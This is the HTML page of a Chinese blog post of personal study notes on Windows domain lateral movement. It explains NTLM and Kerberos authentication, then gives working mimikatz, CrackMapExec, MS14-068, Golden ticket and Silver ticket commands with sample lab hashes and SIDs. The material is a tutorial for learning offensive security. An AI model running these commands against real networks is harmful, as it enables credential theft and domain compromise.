<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="最近一直在学关于域方面的知识，有点凌乱，趁空闲时间把自己的知识梳理下把，静下心边写边学，也方便日后查阅 Come on ~  windows认证机制域渗透不是说你会用多少工具，知道原理才能发挥最大的威力，横向移动中，最关键的也就是对windows认证协议的理解，和使用，这里先梳理一下Windows认证的具体内容。   hash类型  LM HASH  LM Hash 是一个较古老的Hash，在LA">
<meta property="og:type" content="article">
<meta property="og:title" content="域渗透之横向移动">
<meta property="og:url" content="http://yoursite.com/2018/10/29/域渗透之横向移动 /index.html">
<meta property="og:site_name" content="c1y2m3’blog">
<meta property="og:description" content="最近一直在学关于域方面的知识，有点凌乱，趁空闲时间把自己的知识梳理下把，静下心边写边学，也方便日后查阅 Come on ~  windows认证机制域渗透不是说你会用多少工具，知道原理才能发挥最大的威力，横向移动中，最关键的也就是对windows认证协议的理解，和使用，这里先梳理一下Windows认证的具体内容。   hash类型  LM HASH  LM Hash 是一个较古老的Hash，在LA">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bd4728250f8dd15749ee529">
<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bd66733ea3b4a487da3a816">
<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bd66eff2711cd136d9b212a">
<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bd6756750f8dd1574aeeeb0">
<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bd6a2b4db5aa603f18a1cba">
<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bd6a31350f8dd1574b42fdf">
<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bd6a3cd9b521a22ef55364d">
<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bd6a40cea3b4a487dab70d4">
<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bd6a7de2711cd136da23545">
<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bd6a854ea3b4a487dac06af">
<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bd6ab839b521a22ef564973">
<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bd6abef2711cd136da2ce71">
<meta property="og:updated_time" content="2018-11-19T04:06:33.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="域渗透之横向移动">
<meta name="twitter:description" content="最近一直在学关于域方面的知识，有点凌乱，趁空闲时间把自己的知识梳理下把，静下心边写边学，也方便日后查阅 Come on ~  windows认证机制域渗透不是说你会用多少工具，知道原理才能发挥最大的威力，横向移动中，最关键的也就是对windows认证协议的理解，和使用，这里先梳理一下Windows认证的具体内容。   hash类型  LM HASH  LM Hash 是一个较古老的Hash，在LA">
<meta name="twitter:image" content="https://www.yunzhijia.com/microblog/filesvr/5bd4728250f8dd15749ee529">
    
    
        
          
              <link rel="shortcut icon" href="/c1y2m3.github.io/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/c1y2m3.github.io/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/c1y2m3.github.io/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>域渗透之横向移动</title>
    <!-- styles -->
    <link rel="stylesheet" href="/c1y2m3.github.io/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/c1y2m3.github.io/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/c1y2m3.github.io/">主页</a></li>
         
          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
         
          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
         
          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
        
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/c1y2m3.github.io/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/c1y2m3.github.io/2018/10/18/浅谈跨站脚本绕过和防御/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/10/29/域渗透之横向移动 /"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/10/29/域渗透之横向移动 /&text=域渗透之横向移动"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/10/29/域渗透之横向移动 /&title=域渗透之横向移动"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/10/29/域渗透之横向移动 /&is_video=false&description=域渗透之横向移动"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=域渗透之横向移动&body=Check out this article: http://yoursite.com/2018/10/29/域渗透之横向移动 /"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/10/29/域渗透之横向移动 /&title=域渗透之横向移动"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/10/29/域渗透之横向移动 /&title=域渗透之横向移动"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/10/29/域渗透之横向移动 /&title=域渗透之横向移动"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/10/29/域渗透之横向移动 /&title=域渗透之横向移动"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/10/29/域渗透之横向移动 /&name=域渗透之横向移动&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#LM-HASH"><span class="toc-number">1.</span> <span class="toc-text"> LM HASH  </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM-HASH"><span class="toc-number">2.</span> <span class="toc-text">NTLM HASH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NET-NTLM-HASH"><span class="toc-number">3.</span> <span class="toc-text"> NET -NTLM HASH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows认证机制"><span class="toc-number">4.</span> <span class="toc-text"> Windows认证机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM认证"><span class="toc-number">5.</span> <span class="toc-text">NTLM认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#域环境中："><span class="toc-number">6.</span> <span class="toc-text">域环境中：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#p-t-h"><span class="toc-number">7.</span> <span class="toc-text"> p-t-h </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MIMIKATZ"><span class="toc-number">8.</span> <span class="toc-text">MIMIKATZ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRACKMAPEXEC"><span class="toc-number">9.</span> <span class="toc-text">CRACKMAPEXEC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-the-ticket"><span class="toc-number">10.</span> <span class="toc-text"> pass-the-ticket </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ms14-068"><span class="toc-number">11.</span> <span class="toc-text"> ms14-068</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Golden-ticket-黄金凭据"><span class="toc-number">12.</span> <span class="toc-text">Golden ticket(黄金凭据)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Silver-ticket-白银票据"><span class="toc-number">13.</span> <span class="toc-text"> Silver ticket (白银票据)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文章出处："><span class="toc-number">14.</span> <span class="toc-text"> 文章出处：</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        域渗透之横向移动
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
        <span itemprop="name">c1y2m3’blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2018-10-28T16:34:14.000Z" itemprop="datePublished">2018-10-29</time>
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>最近一直在学关于域方面的知识，有点凌乱，趁空闲时间把自己的知识梳理下把，静下心边写边学，也方便日后查阅 Come on ~</p>
<p> windows认证机制<br>域渗透不是说你会用多少工具，知道原理才能发挥最大的威力，横向移动中，最关键的也就是对windows认证协议的理解，和使用，这里先梳理一下Windows认证的具体内容。 </p>
<p> hash类型</p>
<h2 id="LM-HASH"><a href="#LM-HASH" class="headerlink" title=" LM HASH  "></a> LM HASH  </h2><p>LM Hash 是一个较古老的Hash，在LAN Manager协议中使用，非常容易通过暴力破解获取明文凭据，Vista以前的windows OS 使用它 ,Vista之后的版本默认禁用了LM协议，但默些情况下还是可以使用。 </p>
<h2 id="NTLM-HASH"><a href="#NTLM-HASH" class="headerlink" title="NTLM HASH"></a>NTLM HASH</h2><p>Vista以上现代操作系统使用Hash。通常意义上的NTLM Hash 指存储在SAM数据库以及NTDS数据库中对密码进行简要计算后的结果，这类Hash可以直接用于Pth。</p>
<h2 id="NET-NTLM-HASH"><a href="#NET-NTLM-HASH" class="headerlink" title=" NET -NTLM HASH"></a> NET -NTLM HASH</h2><p>Net-NTLM Hash 用于网络身份认证(例如ntlm认证中)，目前分两个版本：<br>Net-NTLMv1<br>Net-NTLMv2 </p>
<p>从xnianq牛那边了解到可以使用Responder等工具获取的到就是NetNTLM，这类hash并不能直接用来Pth 但可以通过暴力破解来获取到明文密码。#未实验过</p>
<h2 id="Windows认证机制"><a href="#Windows认证机制" class="headerlink" title=" Windows认证机制"></a> Windows认证机制</h2><p>工作组使用的ntlm认证而如果机器在域内，则使用基于Kerberos的认证方式。 </p>
<h2 id="NTLM认证"><a href="#NTLM认证" class="headerlink" title="NTLM认证"></a>NTLM认证</h2><p>工作组中：</p>
<ol>
<li>客户端发起认证请求 </li>
<li>服务端收到认证请求，向客户端发送随机数(chanlleng/挑战)</li>
<li>客户端使用NTLM Hash 打乱该随机数，生成Net-NTLM Hash,发送回服务端里会造成pth攻击)。<br><img src="https://www.yunzhijia.com/microblog/filesvr/5bd4728250f8dd15749ee529" alt=""></li>
</ol>
<h2 id="域环境中："><a href="#域环境中：" class="headerlink" title="域环境中："></a>域环境中：</h2><p>比起工作组中，域中多了一个域控的角色 。<br><img src="https://www.yunzhijia.com/microblog/filesvr/5bd66733ea3b4a487da3a816" alt=""></p>
<p><code>1. 首先在Client输入username,password和domain,然后client会把password hash的值缓存在本地。</code></p>
<p><code>2. 之后，client把username的明文发送给server（DC）</code></p>
<p><code>3. DC会生成一个16字节的随机数，即challenge(挑战码)，再传给client</code></p>
<p><code>4. 当clinet收到challenge以后，会先复制一份出来，然后和缓存中的密码hash再一同混合hash一次，混合后的值称为response,之后client再将challenge，response及username一起都传送给server。</code></p>
<p><code>5.server端收到client传过来的这三个值以后都转发给DC。</code></p>
<p><code>6.当DC接过来的这三个值的以后，会根据username到域控的账号数据库(ntds.dit)里面找到该username对应的hash，然后把这个hash拿出来和传过来的chanllenge的值再混合hash.</code></p>
<p><code>7.将(6)中混合的hash跟传来的response进行比较，相同则认证成功，反之，则失败，当然，如果是本地登录，所有验证肯定也全部都直接在本地进行。</code></p>
<h2 id="p-t-h"><a href="#p-t-h" class="headerlink" title=" p-t-h "></a> p-t-h </h2><p>pass-the-hash 在内网渗透中是一个很经典的攻击方式，原理就是攻击者可以直接通过LM Hash 和NTLM hash访问远程主机或服务，而不用提供明文密码 。</p>
<ul>
<li>域/工作组环境</li>
<li>可以获得hash，但是条件不允许对hash爆破</li>
<li><p>内网中存在机器相同的密码 </p>
<h2 id="MIMIKATZ"><a href="#MIMIKATZ" class="headerlink" title="MIMIKATZ"></a>MIMIKATZ</h2></li>
</ul>
<p>mimakatz是一个非常好的工具。</p>
<p>先获取一下hash:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa:logonpasswords</span><br></pre></td></tr></table></figure></p>
<p>得到hash之后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator /domain:workgroup /ntlm:03bebb338e70244589ea67c7439c77ba</span><br></pre></td></tr></table></figure></p>
<p><img src="https://www.yunzhijia.com/microblog/filesvr/5bd66eff2711cd136d9b212a" alt=""></p>
<h2 id="CRACKMAPEXEC"><a href="#CRACKMAPEXEC" class="headerlink" title="CRACKMAPEXEC"></a>CRACKMAPEXEC</h2><p>CrackMapExec 可以对C段中的主机进行批量pth<br>项目地址：<a href="https://github.com/byt3bl33d3r/CrackMapExec.git" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/CrackMapExec.git</a></p>
<p>Kali上可以直接通过apt安装：<br><code>apt-get install crackmapexec</code></p>
<p>对192.168.0.0/24 C段进行批量pth：</p>
<p><code>crackmapexec 192.168.0.0/24 -u administrator -H 03bebb338e70244589ea67c7439c77ba</code></p>
<p><img src="https://www.yunzhijia.com/microblog/filesvr/5bd6756750f8dd1574aeeeb0" alt=""></p>
<h2 id="pass-the-ticket"><a href="#pass-the-ticket" class="headerlink" title=" pass-the-ticket "></a> pass-the-ticket </h2><p>ptt攻击的部分就不是简单的ntlm认证了，它是利用Kerberos协议进行攻击的，这里介绍三种常见的攻击方法：MS14-068,Golden ticket,SILver Ticket.</p>
<p>这里先讲一下Kerberos协议在域中:</p>
<p><code>1. 客户机将明文密码进行ntlm哈希 ，然后和时间戳一起加密。 发送给kdc(域控)，kdc(使用Krbtgt密码hash作为密钥)，对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)票证授权 。</code></p>
<p><code>2. 将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中tgt数据</code></p>
<p><code>3.然后客户端将tgt发送给域控制器KDC请求TGS(票证授权服务)票证，并且对tgt进行检测。</code></p>
<p><code>4.检测成功之后,将目标服务账号的ntlm以及tgt进行加密，将加密的结果返回给客户机 。</code></p>
<h2 id="ms14-068"><a href="#ms14-068" class="headerlink" title=" ms14-068"></a> ms14-068</h2><ul>
<li>MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证.</li>
</ul>
<p>利用过程：</p>
<p>1.whoami/user 得到普通域用户的sid<br><img src="https://www.yunzhijia.com/microblog/filesvr/5bd6a2b4db5aa603f18a1cba" alt=""></p>
<p>2.执行payload生成ccache:</p>
<p><code>MS14-068.exe -u yifan@test.local -s S-1-5-21-4173655609-916892889-516531421-1108 -d dc-01.test.local -p A100b200</code></p>
<p><img src="https://www.yunzhijia.com/microblog/filesvr/5bd6a31350f8dd1574b42fdf" alt=""></p>
<p>3.使用mimikatz注入凭据:</p>
<p><code>kerberos::purge #清空当前机器存在的凭证</code><br><code>kerberos::ptc y:\downloads\TGT_yifan@test.local.ccache</code></p>
<p>显示Injecting ticket : OK就表示注入成功了～</p>
<p>4.查看注入是否成功并且登录域控：<br>查看klist:<br><img src="https://www.yunzhijia.com/microblog/filesvr/5bd6a3cd9b521a22ef55364d" alt=""></p>
<p><code>发现已经将凭证注入进去了～下面可以使用net use进行登录，或者使用psexec,wmi等方法进行远程执行命令。注意，这里登录时，要使用机器名，不要使用IP，否则没办法攻击成功。</code><img src="https://www.yunzhijia.com/microblog/filesvr/5bd6a40cea3b4a487dab70d4" alt=""></p>
<h2 id="Golden-ticket-黄金凭据"><a href="#Golden-ticket-黄金凭据" class="headerlink" title="Golden ticket(黄金凭据)"></a>Golden ticket(黄金凭据)</h2><p>Golden ticket的作用是可以生成容易用户的tgt,在windows认证过程中，客户端将自己的信息 发送给KDC，然后KDC使用krbtgt 用户密码的hash作为密钥进行加密，生成TGT。</p>
<p>==krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿过域控制器的权限，黄金票据可以理解为一个后门 。==</p>
<p>伪造黄金凭据需要具备下面条件：</p>
<ul>
<li>krbtgt用户的hash（意味着你已经有了域控制器的权限了）</li>
<li>域名称</li>
<li>域的SID值</li>
<li>要伪造的用户名 </li>
</ul>
<p>先登陆域控制器，dump krbtgt用户的hash值，获取域sid:</p>
<p><img src="https://www.yunzhijia.com/microblog/filesvr/5bd6a7de2711cd136da23545" alt=""></p>
<p>切换到普通域用户的机器，生成tgt凭证,用户名为administrator:</p>
<p><code>mimikatz # kerberos::golden /user:administrator /domain:test.local /sid:S-1-5-21-4173655609-916892889-516531421 /krbtgt:4c7f31c8a46406c43c397d5b6223ff27 /ticket:test.kirbi</code></p>
<p>然后使用mimi将凭证注入进去,攻击成功:</p>
<p><code>mimikatz # kerberos::ptt test.kirbi</code></p>
<p><img src="https://www.yunzhijia.com/microblog/filesvr/5bd6a854ea3b4a487dac06af" alt=""></p>
<p><code>在此权限下启动cmd：Misc:cmd</code></p>
<h2 id="Silver-ticket-白银票据"><a href="#Silver-ticket-白银票据" class="headerlink" title=" Silver ticket (白银票据)"></a> Silver ticket (白银票据)</h2><p>silver ticket 和golden ticket 不同的是，它不需要和域控制器进行通信，原理是伪造TGS，使用的是计算机的hash进行加密，所以只能访问指定的权限。 </p>
<p>不像Golden ticket ，是由krbtgt用户的密码hash进行加密，伪造tgt可以获得所有权限。</p>
<p>白银票据这里只是对单一的服务进行授权，利用过程和golden ticket差不多，首先上域控制器中的ntlm hash(rc4加密)dump 下来， 然后在普通域用户机器进行伪造权限，进行ptt。</p>
<p>首先登陆域控，dump机器hash ：</p>
<p><code>privilege::debug</code><br><code>sekurlsa::logonpasswords</code></p>
<p><img src="https://www.yunzhijia.com/microblog/filesvr/5bd6ab839b521a22ef564973" alt=""></p>
<p>将hash保存下来，在普通域用户机器中进行ptt </p>
<p><code>kerberos::golden /domain:test.local /sid:S-1-5-21-4173655609-916892889-516531421  /target:dc-01.test.local /rc4:c9ed25bfab6f59f96b60903d064a1974  /service:cifs /user:yifan /ptt</code><br><img src="https://www.yunzhijia.com/microblog/filesvr/5bd6abef2711cd136da2ce71" alt=""><br>这里的cifs是指的文件共享服务，有了cifs服务权限，加可以访问域控制器的文件系统。</p>
<p>当然你也可以同时注入很多service权限 ，不过并不是权限越大越好，有的时候根据自己的需求，一切都ok~</p>
<p>持续更新。</p>
<h2 id="文章出处："><a href="#文章出处：" class="headerlink" title=" 文章出处："></a> 文章出处：</h2><ul>
<li><a href="http://xnianq.cn" target="_blank" rel="noopener">http://xnianq.cn</a></li>
<li><a href="https://www.anquanke.com/post/id/159959" target="_blank" rel="noopener">https://www.anquanke.com/post/id/159959</a></li>
<li><a href="https://mp.weixin.qq.com/s/7YidkhJvmVBxFhYcD7pIfQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/7YidkhJvmVBxFhYcD7pIfQ</a></li>
</ul>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/c1y2m3.github.io/">主页</a></li>
         
          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
         
          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
         
          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#LM-HASH"><span class="toc-number">1.</span> <span class="toc-text"> LM HASH  </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM-HASH"><span class="toc-number">2.</span> <span class="toc-text">NTLM HASH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NET-NTLM-HASH"><span class="toc-number">3.</span> <span class="toc-text"> NET -NTLM HASH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows认证机制"><span class="toc-number">4.</span> <span class="toc-text"> Windows认证机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM认证"><span class="toc-number">5.</span> <span class="toc-text">NTLM认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#域环境中："><span class="toc-number">6.</span> <span class="toc-text">域环境中：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#p-t-h"><span class="toc-number">7.</span> <span class="toc-text"> p-t-h </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MIMIKATZ"><span class="toc-number">8.</span> <span class="toc-text">MIMIKATZ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRACKMAPEXEC"><span class="toc-number">9.</span> <span class="toc-text">CRACKMAPEXEC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-the-ticket"><span class="toc-number">10.</span> <span class="toc-text"> pass-the-ticket </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ms14-068"><span class="toc-number">11.</span> <span class="toc-text"> ms14-068</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Golden-ticket-黄金凭据"><span class="toc-number">12.</span> <span class="toc-text">Golden ticket(黄金凭据)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Silver-ticket-白银票据"><span class="toc-number">13.</span> <span class="toc-text"> Silver ticket (白银票据)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文章出处："><span class="toc-number">14.</span> <span class="toc-text"> 文章出处：</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/10/29/域渗透之横向移动 /"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/10/29/域渗透之横向移动 /&text=域渗透之横向移动"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/10/29/域渗透之横向移动 /&title=域渗透之横向移动"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/10/29/域渗透之横向移动 /&is_video=false&description=域渗透之横向移动"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=域渗透之横向移动&body=Check out this article: http://yoursite.com/2018/10/29/域渗透之横向移动 /"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/10/29/域渗透之横向移动 /&title=域渗透之横向移动"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/10/29/域渗透之横向移动 /&title=域渗透之横向移动"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/10/29/域渗透之横向移动 /&title=域渗透之横向移动"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/10/29/域渗透之横向移动 /&title=域渗透之横向移动"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/10/29/域渗透之横向移动 /&name=域渗透之横向移动&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2019 John Doe
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/c1y2m3.github.io/">主页</a></li>
         
          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
         
          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
         
          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/c1y2m3.github.io/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/c1y2m3.github.io/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/c1y2m3.github.io/lib/jquery/jquery.min.js"></script>
<script src="/c1y2m3.github.io/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/c1y2m3.github.io/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


